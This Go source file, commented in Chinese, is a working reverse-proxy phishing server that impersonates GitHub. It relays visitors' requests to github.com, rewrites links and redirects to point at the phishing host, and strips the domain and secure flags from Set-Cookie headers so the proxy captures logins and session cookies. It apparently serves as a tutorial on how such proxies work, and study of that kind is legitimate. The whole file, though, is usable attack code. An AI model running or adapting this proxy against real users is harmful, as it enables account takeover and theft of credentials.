package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"regexp"
	"strings"
)

const (
	upstreamURL = "https://github.com"
	phishURL    = "http://localhost:8080"
)

// 用來 handler 所有 request
func handler(w http.ResponseWriter, r *http.Request) {
	req := cloneRequest(r)
	// 取得 body & header
	body, header, statusCode := sendReqToUpstream(req)
	body = replaceURLInResp(body, header)

	// 用 range 把 header 中的 Set-Cookie 欄位全部複製給瀏覽器的 header
	for _, v := range header["Set-Cookie"] {
		// 把 domain=.github.com 移除
		newValue := strings.Replace(v, "domain=.github.com;", "", -1)
		// 把 secure 移除
		newValue = strings.Replace(newValue, "secure;", "", 1)

		w.Header().Add("Set-Cookie", newValue)
	}

	// 如果 status code 是 3XX 就取代 Location 網址
	if statusCode >= 300 && statusCode < 400 {
		location := header.Get("Location")
		newLocation := strings.Replace(location, upstreamURL, phishURL, -1)
		w.Header().Set("Location", newLocation)
	}

	w.WriteHeader(statusCode)
	// 取代後的 body
	w.Write(body)
}

// 將打到 phishing 網站的 request， 複製成要打到真正網站的 request
func cloneRequest(r *http.Request) *http.Request {
	// 取得原請求的 method、body
	method := r.Method
	body := r.Body

	// 取得原請求的 url，把它的域名替換成真正的 Github
	path := r.URL.Path
	rawQuery := r.URL.RawQuery
	url := upstreamURL + path + "?" + rawQuery

	// 建立新的 http.Request
	req, err := http.NewRequest(method, url, body)
	if err != nil {
		panic(err)
	}

	// 把原請求的 cookie 複製到 req 的 cookie 裡面
	// 這樣請求被發到 Github 時就會帶上 cookie
	req.Header["Cookie"] = r.Header["Cookie"]

	return req
}

// 拿複製的 request 去請求真正的網站
func sendReqToUpstream(req *http.Request) ([]byte, http.Header, int) {
	// 回傳 http.ErrUseLastResponse 這個錯誤他就不會跟隨 redirect 而是直接得到回覆
	checkRedirect := func(r *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}

	// 建立 http client
	client := http.Client{CheckRedirect: checkRedirect}

	// client.Do(req) 會發出請求到 Github、得到回覆 resp
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}

	// 把回覆的 body 從 Reader（串流）轉成 []byte
	respBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	// res.Body 讀取完，要記得 Close，不然會有 memory leak 等相關問題
	resp.Body.Close()

	// 回傳 body + header + status
	return respBody, resp.Header, resp.StatusCode
}

// 將真正網站拿到的 response 在替換成 phishing 的資訊，給瀏覽器
func replaceURLInResp(body []byte, header http.Header) []byte {
	// 判斷 Content-Type 是不是 text/html
	contentType := header.Get("Content-Type")
	isHTML := strings.Contains(contentType, "text/html")

	// 如果不是 HTML 就不取代
	if !isHTML {
		return body
	}

	// 把 https://github.com 取代為 http://localhost:8080
	// strings.Replace 最後一個參數是指最多取代幾個，-1 就是全部都取代
	bodyStr := string(body)
	bodyStr = strings.Replace(bodyStr, upstreamURL, phishURL, -1)

	phishGitURL := fmt.Sprintf(`%s(.*)\.git`, phishURL)
	upstreamGitURL := fmt.Sprintf(`%s$1.git`, upstreamURL)

	// 尋找符合 git 網址的特徵
	re, err := regexp.Compile(phishGitURL)
	if err != nil {
		panic(err)
	}

	// 取代成 github 網址
	bodyStr = re.ReplaceAllString(bodyStr, upstreamGitURL)

	return []byte(bodyStr)
}

func main() {
	http.HandleFunc("/", handler)
	log.Fatal(http.ListenAndServe(":8080", nil))
}
